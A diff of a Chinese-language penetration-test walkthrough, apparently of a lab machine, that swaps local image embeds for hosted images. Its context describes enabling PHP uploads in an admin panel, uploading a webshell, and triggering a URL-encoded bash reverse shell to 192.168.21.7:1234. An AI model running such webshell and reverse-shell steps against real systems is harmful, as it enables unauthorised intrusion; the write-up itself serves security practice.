@@ -112,7 +112,7 @@ Starting gobuster in directory enumeration mode
 
 把new.sql下载下来看一下发现暴露了版本
 
-![[Pasted image 20260208225330.png]]
+<img width="265" height="77" alt="图片" src="https://github.com/user-attachments/assets/e9355eb7-b5cf-4994-9cba-a546e0f5ce19" />
 
 用sqlite3打开
 
@@ -145,11 +145,11 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 在/admin登录，在设置中设置允许上传php文件，然后传入我们的shell
 
-![[Pasted image 20260208230338.png]]
+<img width="682" height="255" alt="图片" src="https://github.com/user-attachments/assets/816e23b0-0308-43ba-9297-8ee105bec69d" />
 
 上传一个php文件，尝试访问
 
-![[Pasted image 20260208233843.png]]
+<img width="869" height="119" alt="图片" src="https://github.com/user-attachments/assets/52f198b6-3938-40a6-97c3-6bcaab7972de" />
 
 执行反弹shell：http://192.168.21.6/usr/uploads/2026/02/3848067895.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.21.7/1234%200%3E%261%27
 
